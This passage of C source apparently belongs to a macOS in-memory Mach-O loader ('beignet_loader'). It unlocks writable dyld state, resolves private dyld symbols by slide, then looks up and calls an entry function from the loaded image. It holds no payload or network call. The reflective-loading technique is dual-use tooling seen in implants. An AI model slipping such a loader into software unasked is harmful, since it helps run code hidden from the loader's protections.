    *rtopLoader = (uint64_t)topLoader;
  };

  void (^doLoadWithWritableDyldState)(void) = ^(){
    bool entered = enter_writable_dyld_state(mm, LockGuard_func, WriteProtect_func, LockUnlock_func);
    doLoad();
    if (entered) {
      exit_writable_dyld_state(mm, LockGuard_func, WriteProtect_func, LockUnlock_func);
    }
  };

  if (protectedStack && WithProtectedStack_func) {
    WithProtectedStack_func(protectedStack, ^{
      doLoadWithWritableDyldState();
    });
  } else {
    doLoadWithWritableDyldState();
  }

  if (*rcSlot != 0) {
    return *rcSlot;
  }

  void* topLoader = (void*)(uintptr_t)(*rtopLoader);
  if (!topLoader) {
    return 8;
  }

  void* handle = HandleFromLoader_func((void*)*rtopLoader, false);
  if (!handle) {
    return 10;
  }

  NSLookupSymbolInModule_ptr NSLookupSymbolInModule_func = (NSLookupSymbolInModule_ptr)find_symbol(libdyld, "_NSLookupSymbolInModule", slide);
  NSAddressOfSymbol_ptr NSAddressOfSymbol_func = (NSAddressOfSymbol_ptr)find_symbol(libdyld, "_NSAddressOfSymbol", slide);
  if (!NSLookupSymbolInModule_func || !NSAddressOfSymbol_func) {
    return 11;
  }

  NSSymbol sym_entry = NSLookupSymbolInModule_func((NSModule)handle, entry_symbol);
  if (!sym_entry) {
    return 12;
  }

  void* addr_entry = NSAddressOfSymbol_func(sym_entry);
  if (!addr_entry) {
    return 13;
  }

  void (*entry_func)(void) = (void (*)(void))addr_entry;
  entry_func();

  return 0;
}

int main(int argc, char** argv)
{
  (void)argc;
  (void)argv;
  (void)beignet_loader(0, 0, 0);
  return 0;
}
